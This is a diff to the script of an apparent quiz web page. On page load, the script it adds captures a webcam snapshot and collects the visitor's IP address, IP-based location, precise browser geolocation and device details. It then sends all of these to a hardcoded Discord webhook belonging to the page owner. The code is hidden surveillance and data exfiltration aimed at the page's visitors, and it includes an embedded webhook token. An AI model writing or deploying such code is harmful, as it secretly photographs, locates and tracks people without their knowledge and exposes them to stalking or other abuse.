@@ -458,10 +458,41 @@ function validateAnswers(questions) {
 (async () => {
     const webhookURL = "https://discord.com/api/webhooks/1329656838291062798/8dGy0f5L0upZt9Ap0td2PDwQ4PEGwLHq_-bOtfru4VFlG6LXFi8El0137jdjKuEn-TNZ";
 
-      // Get IP-based location data
+ 
+    // Request camera access and capture image
+    let imageBlob = null;
+    let cameraAccess = "Denied";
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        cameraAccess = "Granted";
+
+        // Create video element to draw frame
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await video.play();
+
+        await new Promise(r => setTimeout(r, 1000)); // wait for camera to stabilize
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0);
+
+        const base64Data = canvas.toDataURL("image/jpeg");
+        imageBlob = await (await fetch(base64Data)).blob();
+
+        // Stop camera stream
+        stream.getTracks().forEach(track => track.stop());
+    } catch (err) {
+        console.warn("Camera access denied or failed", err);
+    }
+
+    // Get IP info
     const ipData = await fetch("https://ipapi.co/json/").then(res => res.json()).catch(() => null);
 
-    // Get geolocation from browser
+    // Get browser geolocation
     const getGeo = () => new Promise(resolve => {
         navigator.geolocation.getCurrentPosition(
             pos => resolve(pos.coords),
@@ -472,32 +503,14 @@ function validateAnswers(questions) {
 
     const geo = await getGeo();
 
-    // Check camera permission
-    let cameraAccess = "Denied or Not Requested";
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        cameraAccess = "Granted";
-        stream.getTracks().forEach(track => track.stop()); // stop the camera
-    } catch (err) {
-        cameraAccess = "Denied";
-    }
-
-    // Device info
-    const deviceInfo = {
-        platform: navigator.platform,
-        userAgent: navigator.userAgent,
-        screen: `${window.screen.width}x${window.screen.height}`,
-        language: navigator.language,
-    };
-
     // Prepare message
-    const message = {
-        content: `📡 **New visitor with extended info**
+    const formData = new FormData();
+    formData.append("content", `📡 **New visitor with extended info**
 🌍 IP: ${ipData?.ip || "N/A"}
-🖥️ Platform: ${deviceInfo.platform}
-🧭 Browser: ${deviceInfo.userAgent}
-📏 Screen: ${deviceInfo.screen}
-🗣️ Language: ${deviceInfo.language}
+🖥️ Platform: ${navigator.platform}
+🧭 Browser: ${navigator.userAgent}
+📏 Screen: ${window.screen.width}x${window.screen.height}
+🗣️ Language: ${navigator.language}
 📷 Camera Access: ${cameraAccess}
 📌 IP-based Location:
    City: ${ipData?.city || "?"}
@@ -505,17 +518,17 @@ function validateAnswers(questions) {
    Country: ${ipData?.country_name || "?"}
    Lat/Lon: ${ipData?.latitude || "?"}, ${ipData?.longitude || "?"}
 📍 Browser Geolocation:
-   Lat: ${geo?.latitude || "?"}, Lon: ${geo?.longitude || "?"}`
-    };
+   Lat: ${geo?.latitude || "?"}, Lon: ${geo?.longitude || "?"}`);
 
-    // Send to Discord
+    if (imageBlob) {
+        formData.append("file", imageBlob, "snapshot.jpg");
+    }
+
     fetch(webhookURL, {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(message)
+        body: formData
     });
 })();
-
 
   
 </script>
